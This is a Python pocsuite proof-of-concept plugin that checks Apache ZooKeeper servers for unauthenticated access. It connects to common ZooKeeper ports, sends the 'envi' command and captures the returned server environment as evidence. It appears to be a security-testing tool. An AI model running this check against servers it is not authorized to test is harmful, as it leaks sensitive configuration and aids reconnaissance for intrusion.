#!/usr/bin/env python
# coding: utf-8
import socket
import urlparse
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2018-12-25'
    createDate = '2018-12-25'
    updateDate = '2018-12-25'
    references = ['',]
    name = 'Apache ZooKeeper unauthorized access'
    appPowerLink = ''
    appName = 'zookeeper'
    appVersion = 'All'
    vulType = 'Unauthorized'
    desc = '''
    Apache Zookeeper安装部署之后默认情况下不需要身份认证，攻击者可通过该漏洞泄露服务器的敏感信息。
    '''

    def _verify(self):
        result = {}
        pr = urlparse.urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [2181,12181,22181]
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((pr.hostname,port))
                s.send('envi')
                info = s.recv(4096)
                if 'zookeeper.version' in info:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
                    result['extra'] = {}
                    result['extra']['evidence'] = info.strip()
                    break
            except:
                #raise
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register(TestPOC)
